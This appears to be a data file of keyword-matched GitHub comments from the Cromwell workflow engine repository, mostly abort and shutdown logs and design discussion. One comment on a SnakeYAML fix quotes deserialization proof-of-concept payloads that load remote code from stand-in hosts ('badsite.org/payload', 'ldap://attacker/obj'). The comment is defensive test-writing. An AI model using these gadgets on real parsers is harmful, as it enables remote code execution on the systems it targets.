cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:36,678 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:41,699 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:46,719 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:5083,Abort,Abort,5083,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akk",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1589,Abort,Abort,1589,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1741,Abort,Abort,1741,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,":51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3563,Abort,Abort,3563,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"; [2018-10-23 17:49:32,18] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-10-23 17:49:32,19] [info] JobExecutionTokenDispenser stopped; [2018-10-23 17:49:32,19] [info] WorkflowStoreActor stopped; [2018-10-23 17:49:32,20] [info] WorkflowLogCopyRouter stopped; [2018-10-23 17:49:32,20] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor All workflows finished; [2018-10-23 17:49:32,20] [info] Connection pools shut down; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] SubWorkflowStoreActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] JobStoreActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-10-23 17:49:32,22] [info] ServiceRegistryActor stopped; [2018-10-23 17:49:32,22] [info] CallCacheWriteActor stopped; [2018-10-23 17:49:32,23] [info] DockerHashActor stopped; [2018-10-23 17:49:32,23] [info] IoProxy stopped; [2018-10-23 17:49:32,26] [info] Database closed; [2018-10-23 17:49:32,26] [info] Stream materializer shut down; [2018-10-23 17:49:32,27] [info] WDL HTTP import resolver closed; Workflow d186ca94-b85b-4729-befc-8ad28a05976c transitioned to state Failed; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:7701,Timeout,Timeout,7701,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,8,['Timeout'],['Timeout']
Safety,"<img width=""795"" alt=""screen shot 2018-06-15 at 9 44 14 am"" src=""https://user-images.githubusercontent.com/14941133/41471529-e9b665be-7081-11e8-86e3-1a4804d71adf.png"">. Workflow status `Aborted`, executionStatus/backendStatus `Running`, PAPI Operation status `done:false`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-397628329:186,Abort,Aborted,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-397628329,1,['Abort'],['Aborted']
Safety,"> > I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria.; > ; > But sooner or later we have to do that anyway on the summarization side (and probably on the order of 99% of metadata doesn't need summarizing). By doing it before we write to the DB, I think we could avoid:; > ; > 1. Writing the entries we know don't need to be summarized to the summarization queue.; > 2. Reading the non-summarizable metadata _value_s from the database into Cromwell (and some of them are pretty big) - only to discard them when we read the key and discover it's not summarizable. I'm still reluctant to do that:; 1. Yes, but writing a single additional number per entry to a summary table is not nearly a huge overhead, taking into attention that, as you said, in the same transaction we are writing some huge metadata entries into the `metadata_entry` table.; 2. Summarizer works asynchronously and though I agree that we should keep it's performance good enough, moving metadata key filtering logic to the ""write-metadata-entry"" side of things may affect performance of running workflows.; > Reading the non-summarizable metadata _value_s from the database into Cromwell. Also, if my understanding is correct, this is how summarizer works right now. There are other possible things which we can do to optimize summarizer performance, one of which would be to add additional `metadata_key` column to our new queue table, and then allow summarizer to decide if it wants to fetch data from `metadata_entry` table based on that key. But this is food for thought for future optimizations.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-585322534:347,avoid,avoid,347,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-585322534,1,['avoid'],['avoid']
Safety,"> Could this be related to #4497?. Perhaps, but abort-status-issues have generally been associated with `METADATA_ENTRY` and `WORKFLOW_STORE_ENTRY` getting out of sync. Those two tables are technically in different sub-systems, with `WORKFLOW_STORE_ENTRY` internally tracking running workflows for the engine and `METADATA_ENTRY` reporting back statuses to external users. However, in the above issue, I believe this is a new case of the two ""reporter"" tables `METADATA_ENTRY` and now `WORKFLOW_METADATA_SUMMARY_ENTRY` out of (expected) sync. The way to further diagnose any of these issues would be to look for rows in each of the three tables-- filtered by the aberrant workflow ids-- and see which of the tables are not in the desired state.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4511#issuecomment-452370658:48,abort,abort-status-issues,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4511#issuecomment-452370658,1,['abort'],['abort-status-issues']
Safety,"> Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?. I have been exercising this condition fairly regularly over the last few days while pushing changes and it doesn't seem to cause any problems. The build takes a consistent 6 minutes; if I push 3 changes at 1 minute increments, the builds run on parallel nodes and finish in the order they started.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043:111,avoid,avoid,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043,1,['avoid'],['avoid']
Safety,"> Does it mean that the credentials, which Travis and Jenkins use, are default credentials and the purpose of this task is to set other ones and check that four tests were successfully passed?. Using ""default credentials"" means that any one of a very long list of configuration setups are auto-detected by the AWS Java SDK. In each SDK-configuration case, the credentials are **not** read from the cromwell-config file and then the values passed on to the AWS SDK. Instead the SDK ""discovers"" them. https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-default. This ticket is to instead wire in credentials to the SDK via [Explicitly Specifying Credentials](https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-explicit). In the tests:; - Each of the ""[Default Credential Provider](https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-default)"" options would not be configured on the system; - The `java -Dconfig.file=..."" would contain the AWS key, secret and probably region; - When the various AWS SDK functions run, they each use the passed in credentials to run the commands for S3, Batch, etc.; - The jobs should still run to completion",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-505233165:294,detect,detected,294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-505233165,2,['detect'],['detected']
Safety,"> Hey @kevin-furant, we had success getting it working. Are you seeing any weird logs? Is your Cromwell instance correctly resolving the docker digest (so it's requesting an image like ""imageName@sha256:ad21[...]"")?. We cannot use Docker on our cluster, I use a Singularity image file; ` SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; concurrent-job-limit = 300. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. exit-code-timeout-seconds = 120. runtime-attributes = """"""; Int cpu = 1; Float memory_gb = 1; String? docker_mount; String? docker; String? sge_queue = ""bc_b2c_rd.q,b2c_rd_s1.q""; String? sge_project = ""P18Z15000N0143""; """""". runtime-attributes-for-caching {; # singularity_image: true; }. submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". submit-docker = """"""; IMAGE=/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124/${docker}.sif; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; singularity exec --containall --bind ${docker_mount}:${docker_mount} --bind ${cwd}:${cwd} --bind ${cwd}:${docker_cwd} $IMAGE /bin/bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; `; ` runtime {; docker: ""qc_align""; docker_mount: ""/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124""; cpu: cpu; memory: ""~{mem}GB"" ; };",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680:479,timeout,timeout-seconds,479,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680,2,['timeout'],['timeout-seconds']
Safety,"> How about Centaur tests that submitting pictures of Gumby now produces 4xx errors (and whatever else this fixes)?. I wish! Centaur only handles `200 OK` responses. This fix returns a `400 Bad Request`, quickly, instead of a timeout.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318531402:226,timeout,timeout,226,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318531402,1,['timeout'],['timeout']
Safety,"> I sometimes seem to be getting timeouts on smaller databases (300 seconds for a 2GB file), I think this might be due to Cromwell terminating incorrectly and it not starting up again. If the database is on NFS it might not be cached locally. And with a 100mbit connection it might happen. But this is just speculation. Anyway, I hope my PR on liquibase gets merged soon so I can continue working on the problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629968131:33,timeout,timeouts,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629968131,1,['timeout'],['timeouts']
Safety,"> I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria. But sooner or later we have to do that anyway on the summarization side (and probably on the order of 99% of metadata doesn't need summarizing). By doing it before we write to the DB, I think we could avoid:. 1. Writing the entries we know don't need to be summarized to the summarization queue.; 2. Reading the non-summarizable metadata _value_s from the database into Cromwell (and some of them are pretty big) - only to discard them when we read the key and discover it's not summarizable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584890956:338,avoid,avoid,338,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584890956,1,['avoid'],['avoid']
Safety,"> I'm wondering - what would be the return code for the second worker that cannot create the lock? What in the above says ""Try to make the lock, if it doesn't work, come back and try again (and do this until the container is available.). This is the default behaviour of `flock`, I believe. My flock man page says: ""By default, if the lock cannot be immediately acquired, flock waits until the lock is available."". > Overall I think this is a really important thing to think about - aside from cluster resources, if you are pulling an image from a remote registry, that might have negative consequences for the registry. My understanding of Singularity was that the actual *pulling* would be cached using the Singularity cache, and only the *building* would be duplicated. Is this not right? In any case, this will avoid smashing the Singularity cache at least. > I also wouldn't be sparse with the variables, for some future user coming to read this, I would use --exclusive instead of -x and then --unlock instead of -u so it's explicitly clear. Agreed! I'll edit the OP.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509639973:815,avoid,avoid,815,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509639973,2,['avoid'],['avoid']
Safety,"> If it works the same approach would allow for recovery in the case of Spot interruption. By the way, speaking of this, how would I submit a job to an on-demand compute environment manually? It seems whenever I submit a workflow to cromwell, it always runs in a spot instance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208:48,recover,recovery,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208,1,['recover'],['recovery']
Safety,"> Is it right that like the test didn't like the fact that workflows stayed in the store for too long, even if they all eventually ran? So the submission time sort makes sure that workflows run closer to the order in which they are submitted. @aednichols yes that is correct. So previously, we used to sort by hog group name if there was a tie for lowest workflow running count, and because of this hog groups which started with higher alphabets (c, d, e, f) in Centaur tests were at disadvantage (because hog group names would be first 8 characters of workflow ID) and workflow IDs starting with numbers or lower alphabets would always be picked up causing Centaur to timeout. This should now not happen as we would sort by submission time when there is a tie. >Are there any metrics we can add to look out in advance for disadvantaged users?. @cjllanwarne A separate ticket was created for metrics - [BW-1121](https://broadworkbench.atlassian.net/browse/BW-1121).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838:669,timeout,timeout,669,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6709#issuecomment-1068427838,1,['timeout'],['timeout']
Safety,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:49,Safe,SafeConstructor,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331,1,['Safe'],['SafeConstructor']
Safety,"> Looks good, what were the results of running this to the point that Cromwell did not return a successful response?. It either fails with OOM or becomes totally unresponsive for a long time, while writing different kinds of timeout messages to the log (like ""timeout while trying to fetch new workflows"" or something like that).; Regarding number of rows, I remember that it handled 1.500.000 easily (carbonited within minute or two). I didn't look for precise upper bound, but I think that for 15.000.000 it was failing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-638307488:225,timeout,timeout,225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5525#issuecomment-638307488,2,['timeout'],['timeout']
Safety,"> Looks like this PR didn't catch the test timeout increases for some reason 🤔. Yeah, that's strange. I think this has something to do with the fact that I initially created a draft PR for this branch. Then I closed the draft PR and created a new one, but looks like that didn't help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5337#issuecomment-570604638:43,timeout,timeout,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5337#issuecomment-570604638,1,['timeout'],['timeout']
Safety,"> My understanding of Singularity was that the actual pulling would be cached using the Singularity cache, and only the building would be duplicated. Is this not right? In any case, this will avoid smashing the Singularity cache at least. I think that if it's the case that the (finished image) isn't in the cache, all of the workers would start building (and then not copy to the final thing given that another worker got there first). It's been a while, so it might be good to check with others on slack.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509643616:192,avoid,avoid,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509643616,1,['avoid'],['avoid']
Safety,"> So a docker_pull command would have to be executed at task execution time. But then it is redundant. This command can be part of the submit script. I looked into this a while ago so I might be wrong, but I think a `docker_pull` hook would still be useful, even at runtime, because it would be run only once, and *not* scattered, unlike the actual `submit_docker` hook. This would give it time to pull/convert the container without any race condition issues, meaning we don't have to use `flock` or any of that messy bash. The execution graph would look like:; ```; pull_docker; ⭩ ↓ ⭨; submit submit submit; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627386598:92,redund,redundant,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627386598,1,['redund'],['redundant']
Safety,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:20,safe,safe,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094,1,['safe'],['safe']
Safety,"> This is fantastic work! Which makes me feel terrible saying: I hadn't realized until reviewing the spec just now that the new `returnCodes` actually means exactly the same thing as the existing `continueOnReturnCode`, with the addition of `*`. Would it be possible to modify the existing `continueOnReturnCode` handling to include the runtime attribute `returnCodes` rather than creating a parallel method for controlling the same thing?. I abstracted out the duplicated code between `returnCodes` and `continueOnReturnCode` to a new trait `ReturnCode` (which is very creatively named :) ). I think this is the best solution to avoid code duplication while also supporting both `returnCodes` and continueOnReturnCode`, but let me know if there is anything else I should modify to decrease parallelism.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2012365133:630,avoid,avoid,630,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2012365133,1,['avoid'],['avoid']
Safety,">Don't just create the IO, run it. That's one way to avoid side effects, for sure",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5095#issuecomment-522021556:53,avoid,avoid,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5095#issuecomment-522021556,1,['avoid'],['avoid']
Safety,">The issue is that she's asking to have everything dumped into one location. In many workflows I have a task like this:; ```. task copy {; Array[File] files; String destination. command {; mkdir -p ${destination}; cp -L -R -u ${sep=' ' files} ${destination}; }. output {; Array[File] out = files; }; }; ```; And I apply this task to all final outputs of my workflows because my colleagues do not want to go into super-nested folder structure with many debugging files (like logs and so on), they just want to get the final results! Having a flat-copy feature will save me from copy-pasting this task everywhere =) . Regarding overwrite risks, I think they are exaggerated:; 1) Usually, it takes you multiple runs until you get everything working, however, after that you switch to another dataset and point other members of the team to the folder they should go to pick the results from you. As I understand the copying of the workflow output happens only when the workflow succeeded.; 2) The final output folder is assigned in the options. That means that for another run you can simply change it.; 3) It is possible to put rewriting only if last file is newer than previous.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-345849355:636,risk,risks,636,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-345849355,2,['risk'],['risks']
Safety,"@EvanTheB I think I can answer that for you... much like `check-alive`, the `run-in-background` config point is only relevant for aborts and restarts; cromwell identifies what it needs to kill or restart based on the PID instead of the scheduler job id. The only way that cromwell knows whether a job is done or not is by checking for the existence of the `rc` file.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380681715:130,abort,aborts,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380681715,1,['abort'],['aborts']
Safety,@Horneth - after talking to @scottfrazer I was hoping to avoid this requiring a WDL4S change (i.e. and therefore let it be a Cromwell custom function rather than a core feature of the WDL spec),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/968#issuecomment-224378806:57,avoid,avoid,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/968#issuecomment-224378806,1,['avoid'],['avoid']
Safety,"@Horneth Anyone who would disagree with ""avoid creating new Workflow Actors-like"" should be sent to the guillotine",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195434155:41,avoid,avoid,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195434155,1,['avoid'],['avoid']
